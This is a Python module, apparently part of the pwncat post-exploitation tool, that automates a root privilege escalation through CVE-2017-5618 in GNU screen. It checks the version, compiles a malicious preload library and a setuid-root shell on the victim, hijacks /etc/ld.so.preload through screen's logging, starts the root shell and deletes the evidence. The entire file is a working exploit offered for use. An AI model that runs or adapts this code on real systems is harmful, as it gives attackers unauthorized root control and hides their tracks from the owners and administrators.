#!/usr/bin/env python3

import re
import textwrap
from typing import List

import pwncat
from pwncat.gtfobins import Capability
from pwncat.privesc import Technique, BaseMethod, PrivescError


class Method(BaseMethod):

    name = "screen (CVE-2017-5618)"
    BINARIES = ["cc", "screen"]

    def __init__(self):
        self.ran_before = False

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """ Find all techniques known at this time """

        # If we have ran this before, don't bother running it
        if self.ran_before or not (Capability.SHELL & capability):
            return []

        # Carve out the version of screen
        version_output = pwncat.victim.run("screen -v").decode("utf-8").strip()
        match = re.search(r"(\d+\.\d+\.\d+)", version_output)
        if not match:
            raise PrivescError("could not gather screen version")

        # Knowing the version of screen, check if it is vulnerable...
        version_triplet = [int(x) for x in match.group().split(".")]

        if version_triplet[0] > 4:
            raise PrivescError("screen seemingly not vulnerable")

        if version_triplet[0] == 4 and version_triplet[1] > 5:
            raise PrivescError("screen seemingly not vulnerable")

        if (
            version_triplet[0] == 4
            and version_triplet[1] == 5
            and version_triplet[2] >= 1
        ):
            raise PrivescError("screen seemingly not vulnerable")

        # If screen is vulnerable, try the technique!
        techniques = [Technique("root", self, None, Capability.SHELL)]
        return techniques

    def execute(self, technique: Technique):
        """ Run the specified technique """

        self.ran_before = True

        # Hide the activity by creating hidden temporary files
        libhack_c = (
            pwncat.victim.run("mktemp -t .XXXXXXXXXXX --suffix .c")
            .decode("utf-8")
            .strip()
        )
        libhack_so = (
            pwncat.victim.run("mktemp -t .XXXXXXXXXXX --suffix .so")
            .decode("utf-8")
            .strip()
        )
        rootshell_c = (
            pwncat.victim.run("mktemp -t .XXXXXXXXXXX --suffix .c")
            .decode("utf-8")
            .strip()
        )
        rootshell = pwncat.victim.run("mktemp -t .XXXXXXXXXXX").decode("utf-8").strip()

        # Write the library
        libhack_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                #include <sys/types.h>
                #include <unistd.h>
                __attribute__ ((__constructor__))
                void dropshell(void){{
                    chown("{rootshell}", 0, 0);
                    chmod("{rootshell}", 04755);
                    unlink("/etc/ld.so.preload");
                }}
                """
        ).lstrip()

        with pwncat.victim.open(libhack_c, "w", length=len(libhack_source)) as filp:
            filp.write(libhack_source)

        # Compile the library
        pwncat.victim.run(f"gcc -fPIC -shared -ldl -o {libhack_so} {libhack_c}")

        # Write the rootshell source code
        rootshell_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                int main(void){{
                    setuid(0);
                    setgid(0);
                    seteuid(0);
                    setegid(0);
                    execvp("{pwncat.victim.shell}", NULL, NULL);
                }}
                """
        ).lstrip()

        with pwncat.victim.open(rootshell_c, "w", length=len(rootshell_source)) as filp:
            filp.write(rootshell_source)

        # Compile the rootshell binary
        pwncat.victim.run(f"gcc -o {rootshell} {rootshell_c}")

        # Switch to /etc but save our previous directory so we can return to it
        pwncat.victim.run("pushd /etc")

        # Run screen with our library, saving the umask before changing it
        start_umask = pwncat.victim.run("umask").decode("utf-8").strip()
        pwncat.victim.run("umask 000")
        # sleep(1)
        pwncat.victim.run(f'screen -D -m -L ld.so.preload echo -ne "{libhack_so}"')
        # sleep(1)

        # Trigger the exploit
        pwncat.victim.run("screen -ls")

        # Reset umask to the saved value
        pwncat.victim.run(f"umask {start_umask}")

        # Check if the file is owned by root
        file_owner = pwncat.victim.run(f"stat -c%u {rootshell}").strip()
        if file_owner != b"0":

            raise PrivescError("failed to create root shell")

        # Hop back to the original directory
        pwncat.victim.run("popd")

        # Start the root shell!
        pwncat.victim.run(f"{rootshell}", wait=False)

        # Remove the evidence
        pwncat.victim.run(f"unlink {libhack_so} {libhack_c} {rootshell_c} {rootshell}")
